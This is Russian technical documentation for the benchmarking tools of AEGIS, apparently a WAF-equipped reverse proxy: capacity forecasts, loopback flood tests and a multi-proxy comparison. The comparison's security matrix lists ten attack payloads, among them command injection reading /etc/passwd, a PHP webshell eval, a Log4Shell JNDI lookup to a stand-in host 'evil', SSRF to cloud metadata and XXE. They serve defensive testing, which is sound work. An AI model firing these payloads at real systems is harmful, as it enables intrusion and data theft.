# Бенчмаркинг и сравнение с прокси

AEGIS включает три встроенных, безопасных для запуска на живом хосте измерителя
(аппаратный микро-бенч + прогноз ёмкости, флуд-тесты на loopback и
мультипрокси-сравнение) плюс два внешних нагрузочных CLI-инструмента. Этот
документ объясняет, что именно меряет каждый, как читать числа и какие честные
оговорки сопровождают результаты. Все утверждения здесь привязаны к реальному
коду: `src/benchmark.rs`, `src/benchmark_flood.rs`, `src/benchmark_compare.rs`,
`src/threat_analytics.rs`, `src/bin/aegis-bench.rs`, `src/bin/aegis-distbench.rs`.

> **Главная честная оговорка (повторяется во всём документе).** Лейны AEGIS в
> сравнении и в прогнозах — это **in-process движок** (асинхронный прокси-стек +
> реальный `FilterEngine`/`WafFilter`), а **НЕ полный бинарь `aegis-pingora`** (нет
> TLS/HTTP2-машинерии). Читайте их как «цена инспекции на идентичной задаче», а
> **не** как заявление, что AEGIS быстрее реальных проксей по голой скорости.
> Сильный и честный аргумент AEGIS — **матрица безопасности**, а не RPS.

---

## 1. Обзор: три встроенных измерителя + два CLI

| Инструмент | Файл | Что меряет | Где запускается | Безопасно на живом хосте |
|---|---|---|---|---|
| Аппаратный бенч + прогноз | `src/benchmark.rs` | CPU-int, SHA-256, память → прогноз RPS | admin-панель | да (≈2.5 с CPU-нагрузки) |
| Флуд-тесты | `src/benchmark_flood.rs` | SYN/HTTP/TLS/slowloris/cache на loopback | admin-панель | да (loopback, лимиты) |
| Мультипрокси-сравнение | `src/benchmark_compare.rs` | RPS + матрица безопасности vs nginx/ModSec/HAProxy/Caddy/Envoy | admin-панель | да (loopback, эфемерные инстансы) |
| `aegis-bench` | `src/bin/aegis-bench.rs` | внешняя HTTP-нагрузка по URL | CLI | зависит от цели (бьёт по сети) |
| `aegis-distbench` | `src/bin/aegis-distbench.rs` | распределённая атака с N loopback-алиасов | CLI | да (loopback-алиасы) |

Все три встроенных измерителя живут в admin-панели (страница «Benchmark»,
см. [29-admin-panel.md](29-admin-panel.md)) и доступны через admin API
(см. [30-admin-api.md](30-admin-api.md)).

### Admin-маршруты

| Метод | Путь | Назначение | Роль |
|---|---|---|---|
| `POST` | `/admin/api/benchmark/run` | запустить аппаратный бенч (fire-and-forget) | `Read` |
| `GET` | `/admin/api/benchmark/result` | получить результат аппаратного бенча | `Read` |
| `POST` | `/admin/api/benchmark/flood/run` | запустить флуд-сьют | `Read` |
| `GET` | `/admin/api/benchmark/flood/result` | результат флуд-сьюта | `Read` |
| `POST` | `/admin/api/benchmark/compare/run` | запустить мультипрокси-сравнение | `Read` |
| `GET` | `/admin/api/benchmark/compare/result` | результат сравнения | `Read` |

Роли заданы в `src/admin_auth.rs`: `benchmark/run` и `flood/run` требуют только
`AdminRole::Read`, потому что они «не мутируют ни конфиг, ни сохранённое
состояние — лишь читают факты о железе и крутят CPU/память/loopback-victim»
(комментарий в коде, строки 228–235). GET-результаты покрыты общим
`Read`-catch-all для `/admin/api/`.

Каждый из трёх измерителей защищён CAS-гейтом одновременного запуска
(`compare_exchange(false, true, …)` в `try_start`): второй параллельный запуск
получает HTTP 409 (`*_already_running`). Результат хранится через
`arc_swap::ArcSwap` (читатели не блокируются) и, для флуд/сравнения,
дополнительно пишется в файл-результат с TTL-окном «running» (`pingora_admin.rs`,
`read_result_file` / `result_running_fresh`, окно 120 с).

---

## 2. Аппаратный бенч и прогноз ёмкости (`src/benchmark.rs`)

### 2.1. Что он делает

`run_benchmark()` (синхронный, рассчитан на запуск из `spawn_blocking`) запускает
три микро-бенча против жёсткого лимита ~2.5 секунды стенки, затем линейно
прогнозирует ожидаемый RPS форвардинга / TLS / WAF.

| Микро-бенч | Функция | Метрика | Бюджет |
|---|---|---|---|
| Целочисленный CPU | `bench_cpu_integer(ms)` | `cpu_integer_gops` (Gop/s) | 700 мс |
| SHA-256 | `bench_sha256(ms)` | `sha256_mhash_per_sec` (MH/s) | 1000 мс |
| Память | `bench_memory_bw()` | `mem_bw_gbps` (ГБ/с) | один проход 64 МиБ ×2 |

* `bench_cpu_integer` — плотный XOR/shift/rotate-цикл по `u64`, батч по 1024
  итерации, 4 операции на итерацию.
* `bench_sha256` — `Sha256::digest` 64-байтного буфера в плотном цикле (батч 256),
  через `sha2`-крейт.
* `bench_memory_bw` — `Vec<u64>` на 8M элементов (64 МиБ): проход записи +
  проход чтения = 128 МиБ суммарного IO, делённые на время.

### 2.2. Per-core методология: «нагрузка видна, число — на ядро»

Важная деталь реализации (`parallel_avg_per_core`, комментарии V242):

1. **Сброс CPU-affinity.** Каждый воркер `aegis-pingora` запинен на одно ядро
   (`CPUAffinity`). Бенч-поток, унаследовавший этот пин, иначе теснился бы на
   одном ядре. `unpin_to_all_cores()` (`sched_setaffinity` на все онлайн-CPU)
   снимает пин, чтобы пул реально размазался по машине — нагрузка видна на
   графике, и числа корректны.
2. **Запуск на ВСЕХ ядрах одновременно.** CPU- и SHA-проходы крутятся на
   `cpu_count` потоках сразу (`std::thread::scope`).
3. **Усреднение до per-core.** Возвращается **средний результат на ядро**, потому
   что прогнозы (`est_*_rps`) уже сами домножаются на число ядер и
   reuseport-фактор — значит исходная цифра обязана оставаться per-core.

> ⚠️ Это означает: `sha256_mhash_per_sec` в результате — **на одно ядро**, не
> суммарно по машине.

### 2.3. Аппаратные факты

`HardwareFacts` собирает `cpu_model`, `cpu_count` (через `crate::topology::host_info()`),
`ram_total_mb` / `ram_available_mb` (парсер `/proc/meminfo`, только Linux; на
прочих ОС `(0, 0)`) и `arch`.

### 2.4. Модель прогноза и калибровочные константы

Прогноз (`compute_projections`) масштабируется линейно от per-core SHA-балла
относительно эталонной 8-ядерной коробки:

```text
clock_ratio   = sha256_mhash_per_sec / REF_SHA256_MHS        // REF = 30.0 MH/s
est_fwd_rps   = K_FWD_PER_CORE * clock_ratio * N * 0.93 * reuseport_factor
                                                             // K_FWD_PER_CORE = 55_000
est_tls_rps   = REF_TLS_HS_PER_CORE * clock_ratio * N * reuseport_factor
                                                             // REF_TLS = 3_700 хэндшейков/с/ядро
est_waf_rps   = est_fwd_rps * 0.85
```

где `N = cpu_count`. Константы сматчены с эталонным замером из `pow_captcha.rs`.

**Формула методологии — `per-core SHA × ядра × reuseport`:** прогноз =
`(балл на ядро / эталонный балл) × число ядер × reuseport-фактор × поправки`.

#### Reuseport-фактор (`detect_reuseport`)

| Условие | Фактор | Смысл |
|---|---|---|
| `AEGIS_PINGORA_REUSEPORT=1/true/yes` | `0.90` | REUSEPORT активен |
| env выставлен в иное | `0.35` | контеншн на едином accept-lock |
| env не задан, воркеров > 1 (топология) | `0.90` | предположительно активен |
| дефолт | `0.90` | большинство деплоев используют REUSEPORT |

Подробнее о SO_REUSEPORT и многопроцессности — [06-workers.md](06-workers.md).

#### Классификация «бутылочного горла» (`bottleneck`, в порядке приоритета)

| Значение | Условие | Сообщение оператору |
|---|---|---|
| `reuseport_off` | REUSEPORT выкл и воркеров > 1 | включите SO_REUSEPORT, восстановит ~2.5× |
| `core_count` | живых воркеров < ядер | добавьте воркеров под число ядер |
| `clock_bound` | SHA-балл < 18.0 MH/s | CPU троттлится/виртуализирован/turbo off — прогноз пессимистичен |
| `throughput_optimal` | всё хорошо | раскладка оптимальна |

### 2.5. КРИТИЧЕСКАЯ оговорка: низкий SHA = нет аппаратного ускорения (типично в VM)

Современные x86_64 имеют инструкции `SHA-NI`, ARM — `crypto`-расширения; на голом
железе с ускорением single-core SHA-256 через `sha2`-крейт даёт десятки MH/s.
**Внутри VM аппаратное SHA-ускорение часто не проброшено** (или CPU делится /
turbo выключен), и балл падает ниже порога **18.0 MH/s** → срабатывает
`clock_bound`.

Поскольку `clock_ratio = sha / 30.0` входит во ВСЕ прогнозы линейным множителем,
**низкий SHA автоматически делает прогноз ёмкости пессимистичным**. Это не
ошибка измерения — это честное «не знаю точно, занижаю». В `bottleneck_detail`
явно пишется: *«SHA-256 score X MH/s ниже порога 18 MH/s — CPU сильно троттлится,
шарится/виртуализирован, или turbo-boost выключен. Прогнозы могут быть
пессимистичны.»*

> Практический вывод: на bare-metal с SHA-NI верьте прогнозу как порядку
> величины; в VM считайте `est_*_rps` нижней границей и проверяйте реальными
> флуд-тестами (раздел 3) или внешней нагрузкой (раздел 5).

### 2.6. Поля результата (`BenchmarkResult`)

Сериализуется как тело `GET /admin/api/benchmark/result`. Статусы: `idle` /
`running` / `done` / `error`. **Все** результаты помечены `estimate: true` и
несут `calibration_note` (`CALIBRATION_NOTE`): «ESTIMATE — спроецировано из
микро-бенч-баллов против измеренной 8-ядерной коробки; реальная пропускная
способность зависит от микса запросов, доли TLS, латентности апстрима и
нагрузки».

> Прогнозы НЕ учитывают: микс запросов, латентность апстрима, headroom NIC,
> планирование ядра, долю TLS-resumption, реальное распределение нагрузки.
> Используйте как порядок величины, не как capacity-SLA.

---

## 3. Флуд-тесты (`src/benchmark_flood.rs`)

Там, где аппаратный бенч *прогнозирует*, флуд-сьют отвечает на реальный вопрос
оператора: **«сколько каждого флуда эта коробка реально выдержит?»** Меряются
*достигнутые* числа (устойчивый RPS, принято/отброшено, p50/p99), а не
экстраполяция от одного ядра.

### 3.1. Контракт безопасности (это крутится на ЖИВОМ хосте)

* **Только loopback.** Каждый listener биндит `127.0.0.1:0` (эфемерный порт). Ни
  один пакет не покидает коробку; реальные listen-сокеты прокси не трогаются.
* **Ограниченная длительность.** Каждый сценарий ≤ `SCENARIO_DURATION` (900 мс),
  весь сьют — `FLOOD_TOTAL_BUDGET` (8 с, по таймауту → статус `error`).
* **Ограниченная интенсивность.** `MAX_CONCURRENCY = 256`, `MAX_CONNS = 2_000` —
  нельзя исчерпать FD хоста.
* **Самодостаточность.** Генератор нагрузки и жертва-сервер — в одном процессе:
  флуд физически не может задеть тенанта.

Результат всегда несёт `loopback: true` и `CAVEAT`: это нижняя граница; продакшен
дополнительно платит NIC, реальный RTT и стоимость апстрима.

### 3.2. Пять сценариев

| `id` | Сценарий | Метрика (`unit`) | Что стрессирует |
|---|---|---|---|
| `syn` | SYN flood (установка соединения) | `conn/s` | accept-очередь ядра + accept-loop |
| `http` | HTTP request flood | `req/s` | парсинг строки/заголовков + ответ |
| `tls` | TLS handshake flood | `hs/s` | полный рукопожатие rustls без resumption |
| `slowloris` | Slowloris (медленный hold) | `conns` | удержание медленных соединений |
| `cache` | Cache-served rps | `req/s` | отдача из памяти, без апстрима/челленджа |

**SYN.** Сырые SYN без `CAP_NET_RAW` слать нельзя и XDP-путь на живой коробке
трогать нельзя, поэтому меряется слой, который SYN-флуд реально нагружает: пул
дозвонщиков открывает полные TCP-соединения (= завершённое 3-way рукопожатие)
максимально быстро; жертва принимает и сразу закрывает. Это потолок установки
соединений, который защищает XDP/SYN-cookie-путь (см.
[13-xdp-ebpf.md](13-xdp-ebpf.md)).

**HTTP.** Минимальная HTTP/1.1-жертва парсит строку+заголовки и отвечает 200.
Достигнутый темп делится на «allowed» лейн (дешёвый pass) и моделируемый
«challenged» лейн: каждый 5-й запрос платит эмуляцию стоимости эмиссии
PoW/JS-челленджа (см. [15-challenge-ladder.md](15-challenge-ladder.md)).

**TLS.** rustls-сервер со свежим self-signed сертификатом принимает полные
рукопожатия; генератор открывает новое TLS-соединение на операцию (**без
resumption**) — худший случай. В `detail` явно: session tickets / resumption
поднимают реальный потолок заметно выше этой цифры. Подробнее о TLS —
[08-tls-certificates.md](08-tls-certificates.md).

**Slowloris.** Ограниченный пул «атакующих» соединений дрипает частичный запрос
по байту, не завершая его. Жертва моделирует **дедлайн чтения заголовков 700 мс**
и реапит соединение по таймауту. Достигнутое значение — счётчик пиковых
*одновременных* холдеров, **не** темп в секунду.

**Cache.** Самый горячий путь: ответ уже в памяти (готовый 1 КиБ-буфер,
`X-Cache: HIT`), без апстрима и челленджа — потолок отдачи статики/cache-hit.

### 3.3. Вердикты — и почему slowloris инвертирован

Для throughput-сценариев (`verdict_for`):

| Drop-ratio (`dropped / (served+dropped)`) | Вердикт |
|---|---|
| ≤ 1% | `pass` |
| ≤ 15% | `degraded` |
| > 15% | `fail` |
| всего 0 операций | `fail` |

**Slowloris судится ИНАЧЕ.** Здесь «refused» соединения — это медленные холдеры,
которые дедлайн чтения **зареапил** (защита работает), а не провал. Реальный
провал — обратный: медленные холдеры *накапливаются* к лимиту пула. Поэтому
вердикт строится на ограниченности одновременности (`peak_held` против цели),
а не на drop-ratio:

| Условие | Вердикт |
|---|---|
| `served == 0` (ни одного медленного соединения) | `fail` |
| `peak_held * 2 < cap` (реапер держит пул пустым) | `pass` |
| `peak_held < cap` | `degraded` |
| `peak_held >= cap` (все холдеры осели, пул насыщен) | `fail` |

### 3.4. Латентность

`LatHist` — lock-free гистограмма с логарифмически-подобными микросекундными
бакетами (от 10 мкс до 5 с + overflow). `p99_ms` / `p50_ms` берут верхнюю границу
бакета (приблизительный перцентиль, без аллокаций на операцию).

---

## 4. Мультипрокси-сравнение (`src/benchmark_compare.rs`)

Флуд/ёмкость меряют AEGIS в изоляции. Это модуль отвечает на следующий вопрос:
**«как это сравнивается с другими прокси на той же коробке?»** — в двух честных
измерениях: пропускная способность и покрытие безопасности.

### 4.1. Цели (фиксированный порядок отображения)

`TARGETS` — единственный источник истины для порядка и метаданных:

| Порядок | `name` | `kind` | `has_waf` | Что это |
|---|---|---|---|---|
| 1 | `AEGIS (raw)` | `aegis` | нет | async-прокси-стек AEGIS, без инспекции |
| 2 | `AEGIS + WAF` | `aegis` | **да** | тот же стек + реальный `FilterEngine`/`WafFilter` на запрос |
| 3 | `nginx` | `proxy` | нет | голый реверс-прокси |
| 4 | `nginx+ModSec+CRS` | `proxy` | **да** | ModSecurity v3 + OWASP CRS (~914 правил) |
| 5 | `HAProxy` | `proxy` | нет | голый реверс-прокси |
| 6 | `Caddy` | `proxy` | нет | голый реверс-прокси |
| 7 | `Envoy` | `proxy` | нет | голый реверс-прокси |

Если бинарь отсутствует на хосте — цель помечается `available: false`, матрица
всё равно рендерится.

### 4.2. Методология: все реверс-проксируют на один апстрим, атаки сквозь прокси

Ключ к честности (`run_comparison`):

* **Один общий in-process апстрим `U`** (`spawn_inprocess_server`) — крошечный
  tokio-сервер, отвечающий `200 ok`. **Каждая** цель — включая обе лейны AEGIS —
  реверс-проксирует на ОДИН И ТОТ ЖЕ `U`. Все платят идентичный
  proxy→upstream-хоп (apples-to-apples).
* **Пропускная способность.** Один и тот же ограниченный keep-alive генератор
  (`measure`, окно `MEASURE_DURATION = 1500` мс, `MEASURE_CONCURRENCY = 64`) бьёт
  по loopback-listener каждой цели. Отдаёт `throughput_rps`, `p50_ms`, `p99_ms`.
* **Покрытие безопасности.** Каждый атакующий payload отправляется **СКВОЗЬ**
  прокси к `U`: 4xx → `blocked: true`; 200 (дошёл до `U`) → `blocked: false`.
* **Все на всех ядрах.** Для честности каждый внешний прокси конфигурируется на
  использование всех ядер: nginx `worker_processes auto`, HAProxy `nbthread <ncpu>`,
  Caddy `GOMAXPROCS`, Envoy `--concurrency <ncpu>`; AEGIS-лейны — многопоточный
  tokio-runtime. Гистограмма латентности здесь линейная (50 мкс-бакеты до 25 мс)
  для суб-миллисекундного разрешения loopback-запросов.

#### Как лейны AEGIS остаются честными

`spawn_aegis_proxy` — это in-process **реверс-прокси**: на каждое
клиентское соединение открывается одно keep-alive-соединение к `U`, запрос
форвардится, ответ релеится обратно. Единственная разница между лейнами:

* **AEGIS (raw)** — `inspector = None`, без инспекции.
* **AEGIS + WAF** — `inspector = Some(...)`, который на каждом запросе вызывает
  `inspector.inspect()` ПЕРЕД форвардингом — ровно там, где живой data plane
  решает allow/deny.

> **HONESTY NOTE из кода (дословно по смыслу):** раньше эта лейна *терминировала
> локально* (отдавала 200 без форвардинга), что пропускало апстрим-хоп и
> **завышало** AEGIS. Теперь она форвардит на тот же `U`. Это **не** полный
> бинарь `aegis-pingora` (нет TLS/HTTP2-машинерии) — читайте как стоимость
> прокси-стека + инспекции, замеренную честно.

#### Что именно крутит «AEGIS + WAF» (`Inspector`)

В порядке приоритета:

1. **`Inspector::Engine`** (approach A — самый верный): полный
   `FilterEngine::evaluate` — вся цепочка фильтров (WAF, бот, rate-limit,
   smuggling, honeypot, scorer), как на живом data plane. Хэндл движка
   прокидывается из `bin/aegis-pingora` → `AdminProxy::with_engine` → хендлер
   `compare/run` (`pingora_admin.rs`: `let engine = self.engine.clone();`).
2. **`Inspector::Waf`** (approach B, fallback): отдельный `WafFilter`-скан
   (доминирующая стоимость инспекции), когда хэндл движка недоступен.

Запрос для замера (`synthetic_ctx`) — **благонамеренный** GET, который пайплайн
**пропустит** (`FilterAction::Allow`, проверено тестом
`synthetic_ctx_is_benign_allow`). Мы меряем стоимость инспекции на счастливом
пути, а не дешёвый ранний deny враждебного запроса. Холодные фингерпринты
(`ja3`/`ja4`/…) оставлены `None`, как и для не-TLS-запроса (см.
[11-tls-fingerprinting.md](11-tls-fingerprinting.md)).

### 4.3. Матрица безопасности (`SECURITY_CASES`)

Десять репрезентативных атак, отправляемых сквозь каждую цель:

| Атака | Sample (path) |
|---|---|
| SQL injection | `/?id=1 union select password from users` |
| XSS | `/?q=<script>alert(1)</script>` |
| Path traversal | `/?file=../../../../etc/passwd` |
| Command injection | `/?host=127.0.0.1;cat /etc/passwd` |
| PHP webshell | `/?c=eval($_POST[0])` |
| Webshell drop | `/uploads/c99.php` |
| Log4Shell / RCE | `/?x=${jndi:ldap://evil/a}` |
| LFI (php wrapper) | `/?p=php://filter/convert.base64-encode/resource=index` |
| SSRF (metadata) | `/?url=http://169.254.169.254/latest/meta-data/` |
| XXE | `/?xml=<!DOCTYPE foo [<!ENTITY x SYSTEM "file:///etc/passwd">]>` |

**Перцент-кодирование (тонкость честности).** Сырые сэмплы содержат пробелы,
`<`, `>`, `"`, `{`, `}`, `;`, `$` — отправленные дословно, они дают невалидную
request-line, и голый прокси вернёт 400 на *парсинге HTTP* (не на WAF-решении),
что ложно прочиталось бы как «blocked». Поэтому `encode_for_wire` перцент-кодирует
payload (структурные URL-символы `/?=&:.` сохраняются). WAF (AEGIS,
ModSecurity/CRS) URL-декодируют перед матчингом, так что закодированные атаки их
по-прежнему триггерят; голый прокси форвардит теперь-валидный запрос на origin
(200) → корректно читается как «passed».

**Откуда берутся вердикты:**

* `AEGIS (raw)`: `blocked: false` всегда (нет WAF).
* `AEGIS + WAF`: `blocked = cat.is_some()`, где `cat = waf.signature_category(sample)`
  — категория из in-process WAF-матчера (см. [10-waf.md](10-waf.md)).
* Внешние прокси: `probe(addr, sample)` шлёт GET сквозь прокси, `blocked` истинно,
  если статус в диапазоне 400..500.
* Отсутствующий бинарь: `applicable: false`, `blocked: false`.

Ожидаемый расклад (из дизайна и тестов `security_matrix_blocks_all_samples`):
голые прокси (nginx, HAProxy, Caddy, Envoy) форвардят всё → `blocked: false`;
`nginx+ModSec+CRS` и `AEGIS + WAF` блокируют → `blocked: true`. Именно эта
**матрица безопасности — честный сильный аргумент** AEGIS, а не RPS.

### 4.4. Провижининг стенда (Debian 12 amd64)

Конкуренты ставятся из apt + один скачанный бинарь Envoy. Документировано прямо
в шапке `benchmark_compare.rs`:

```bash
apt install haproxy caddy libnginx-mod-http-modsecurity modsecurity-crs libmodsecurity3
# Envoy (нет apt-пакета): скачать запиненный статический бинарь в /usr/local/bin/envoy
# Затем ОТКЛЮЧИТЬ сервисы, чтобы они не держали :80/:443 — их владелец AEGIS:
systemctl disable --now nginx haproxy caddy
systemctl mask caddy caddy-api          # caddy-api может независимо биндить порты
```

Бенч поднимает СВОИ эфемерные инстансы на loopback-high-портах. Поиск бинарей —
`find_binary` (явные пути + `command -v`). Каждый инстанс:

* биндит `127.0.0.1:<free port>`, реверс-проксирует на общий `U`, работает
  **непривилегированно** (все pid/log/temp под per-run temp-dir `aegis-<prefix>-bench-<pid>-<port>`);
* авто-сносится на drop (`ProxyRun::Drop` → `kill` + `remove_dir_all`).

Детали запуска по целям (зацеплено в `launch_proxy`):

* **nginx** — `worker_processes auto`, `proxy_pass` на upstream с `keepalive 64`,
  `daemon off`, temp-subdirs под run-dir.
* **nginx+ModSec+CRS** — `load_module ngx_http_modsecurity_module.so`,
  `SecRuleEngine On`, CRS подключается прямыми `Include` реальных файлов
  (`/usr/share/modsecurity-crs/rules/*.conf`), **не** через Debian-`owasp-crs.load`
  (тот использует `IncludeOptional` — Apache-mod_security2-директиву, которую
  libmodsecurity3 не понимает). Перед стартом — `nginx -t` preflight (ловит
  ABI-break / опечатку пути). Доступно, только если есть nginx + модуль-коннектор +
  `crs-setup.conf`.
* **HAProxy** — `no strict-limits` (иначе FATAL при невозможности поднять
  RLIMIT_NOFILE непривилегированно), `nbthread <ncpu>`, `-db` (одиночный
  foreground-процесс для чистого kill-on-drop).
* **Caddy** — `admin off` (нет :2019), `auto_https off`, `http://` (чистый HTTP),
  лог в discard, изолированные XDG/HOME под run-dir.
* **Envoy** — минимальный HCM → router → STATIC-cluster, `--use-dynamic-base-id`,
  `--concurrency <ncpu>`. Прогревает кластеры перед биндом (~3 с).

Общий бюджет — `TOTAL_BUDGET = 90` с (семь целей меряются + пробятся
последовательно, т.к. каждая биндит порт); по таймауту → статус `error`.

### 4.5. Поля результата

`ComparisonResult` несёт `targets: Vec<TargetResult>` (имя, kind, available,
version, throughput_rps, p50/p99, has_waf) и `security: Vec<SecurityRow>` (атака,
sample, category, по одному `SecVerdict` на цель в порядке отображения) плюс
объёмный `CAVEAT`, повторяющий все оговорки этого раздела.

---

## 5. Внешние CLI-бенчмарки

### 5.1. `aegis-bench` (`src/bin/aegis-bench.rs`)

Простой внешний HTTP-нагрузочник (hyper-клиент) для AEGIS/nginx по URL.

```bash
aegis-bench --url http://127.0.0.1/ \
  --duration-secs 30 --concurrency 200 --rps 0 --timeout-ms 3000 --method GET
```

| Флаг | Дефолт | Назначение |
|---|---|---|
| `--url` | (обяз.) | целевой URL |
| `--duration-secs` | 30 | длительность |
| `--concurrency` | 200 | число воркеров |
| `--rps` | 0 | целевой RPS (0 = без ограничения, max throughput) |
| `--timeout-ms` | 3000 | таймаут запроса |
| `--method` | `GET` | HTTP-метод |

При `--rps > 0` каждый воркер держит ставку `rps/concurrency` (open-loop тики).
Выводит (`key=value`, машинно-читаемо): `total_requests`, `achieved_rps`, `ok`,
`errors`, `timeouts`, `error_rate_pct`, распределение `status_2xx..5xx`,
`latency_ms_p50/p95/p99`. Перцентиль — `data[round((p/100)*(n-1))]`.

> Это инструмент, который реально уходит по сети к цели — запускайте с
> осторожностью против продакшена.

### 5.2. `aegis-distbench` (`src/bin/aegis-distbench.rs`)

Симулятор **распределённого атакующего**. Идея (V105): `accept()` Pingora
сообщает peer-адрес из того, чем клиент забиндил источник. Алиася loopback на
`127.0.0.2 .. 127.0.0.{N+1}` и биндя каждое соединение на отдельный алиас, можно
сымитировать N атакующих против одного AEGIS **без** PROXY-protocol на listener
(в pingora-core 0.8 его нет).

Пре-реквизит (Linux):

```bash
for i in $(seq 2 N); do sudo ip addr add 127.0.0.$i/8 dev lo; done
```

Запуск:

```bash
aegis-distbench --target http://127.0.0.1/ --sources 50 \
  --requests-per-source 200 --concurrency-per-source 4
```

| Флаг | Дефолт | Назначение |
|---|---|---|
| `--target` | (обяз.) | URL цели |
| `--sources` | 50 | число различных source-IP (`127.0.0.2..`) |
| `--requests-per-source` | 200 | запросов с каждого источника |
| `--concurrency-per-source` | 4 | in-flight на источник |
| `--path` | `/?q=union+select+1` | путь (по умолчанию триггерит WAF) |
| `--timeout-secs` | 60 | страховочный таймаут |

Каждый «источник» получает свой hyper-клиент, чей `HttpConnector` биндит
исходящий TCP на свой source-IP (`set_local_address`) — это рычаг, заставляющий
per-IP-скорер AEGIS видеть различных атакующих. Выводит: elapsed, total, `200 OK`,
`403 forbidden`, errors, total RPS, bytes. Дефолтный путь специально хитит WAF —
удобно проверять детект и кластерную агрегацию (`/admin/threats`).

`aegis-distbench` напрямую упражняет два сигнала из `src/threat_analytics.rs`
(см. раздел 6): per-IP бот-детект и распределённый DDoS-детект по «многим
различным IP на один эндпоинт».

---

## 6. Связь с threat-analytics (`src/threat_analytics.rs`)

`ThreatAnalytics` — два дешёвых rolling-window агрегатора (окно `WINDOW = 300` с,
5 минут), которые data plane наполняет по мере решений; admin-UI разбивает их на
две страницы (см. [29-admin-panel.md](29-admin-panel.md) и
[24-request-log.md](24-request-log.md)):

* **`observe_bot(ip, reason)`** — одиночные боты. `BotReason`: `UaFpMismatch`,
  `NoUserAgent`, `HighThreatScore`, `HighMlScore`, `HoneypotHit`, `WafSignature`,
  и `Compound` (несколько сигналов на один IP — bitmask `reasons_seen`). Лимит
  `MAX_TRACKED_BOTS = 256` с вытеснением самого старого.
* **`observe_endpoint_hit(host, path, ip)`** — DDoS/ботнет. Эндпоинт считается
  DDoS-целью, когда по нему ударило **≥ `DDOS_DISTINCT_IP_THRESHOLD` (10)**
  различных IP в окне. Именно «различные IP на один эндпоинт» отделяет DDoS от
  одиночного бота (тесты `ddos_threshold_requires_many_ips`,
  `endpoints_with_single_ip_never_show_as_ddos`). Лимит
  `MAX_TRACKED_ENDPOINTS = 256`.

`top_bots(limit)` сортирует по hits desc; `top_ddos_targets(limit)` — по
distinct_ips desc (только эндпоинты над порогом). `evict_stale()` вызывается из
PingoraBackground-тика. Это **не** бенчмарк-модуль — но именно его сигналы
наблюдаешь, прогоняя `aegis-distbench` (распределённый источник → DDoS-детект) и
любой WAF-триггерящий флуд (→ бот-детект).

---

## 7. Как правильно читать числа

1. **Аппаратный прогноз — это `estimate: true`, порядок величины, не SLA.**
   Линейная экстраполяция от per-core SHA. Не учитывает микс запросов, апстрим,
   NIC, TLS-resumption.
2. **Низкий SHA (`clock_bound`, < 18 MH/s) → прогноз ПЕССИМИСТИЧЕН.** Типично в
   VM без проброшенного SHA-ускорения. На bare-metal с SHA-NI — доверяйте больше.
3. **SHA-балл в результате — на ОДНО ядро.** Прогнозы сами домножают на число
   ядер × reuseport-фактор.
4. **Флуд-числа — loopback, нижняя граница.** Реальная сеть добавит NIC, RTT,
   стоимость апстрима. `loopback: true` всегда.
5. **TLS-флуд — без resumption, худший случай.** Реальный потолок с session
   tickets заметно выше.
6. **Slowloris читается инвертированно:** высокий `dropped`/«refused» здесь —
   защита (реапинг), а не провал. Провал — насыщение пула холдерами.
7. **Сравнение: throughput — apples-to-apples ПРОКСИ-задача, но НЕ полный
   `aegis-pingora`.** Лейны AEGIS — in-process движок (без TLS/HTTP2-машинерии).
   **Не** интерпретируйте их как «AEGIS быстрее nginx по голой скорости».
8. **Реальная ценность сравнения — матрица безопасности.** Голые прокси
   форвардят все 10 атак; WAF-цели (`AEGIS + WAF`, `nginx+ModSec+CRS`) блокируют.
   Сопоставляйте overhead WAF (падение RPS с-WAF против raw, в %) с покрытием.
9. **Накладные WAF в %:** сравнивайте `AEGIS + WAF` против `AEGIS (raw)` —
   это честная цена защиты на идентичной reverse-proxy-задаче на той же коробке.
10. **Отсутствующий бинарь = `available: false`**, не ноль-производительность;
    его колонка в матрице — `applicable: false`, не «прошёл атаку».

---

## См. также

* [05-requirements.md](05-requirements.md) — требования к железу.
* [06-workers.md](06-workers.md) — SO_REUSEPORT, воркеры.
* [10-waf.md](10-waf.md) — сигнатуры, категории, `signature_category`.
* [13-xdp-ebpf.md](13-xdp-ebpf.md) — XDP/SYN-cookie fast-path.
* [15-challenge-ladder.md](15-challenge-ladder.md) — PoW/JS-челленджи.
* [23-security-model.md](23-security-model.md) — матрица угроз и покрытия.
* [27-performance-tuning.md](27-performance-tuning.md) — тюнинг и build-профиль.
* [29-admin-panel.md](29-admin-panel.md) — страница Benchmark.
* [30-admin-api.md](30-admin-api.md) — маршруты `/admin/api/benchmark/*`.
* 42-текущее-состояние-STATUS.md — статус фич.
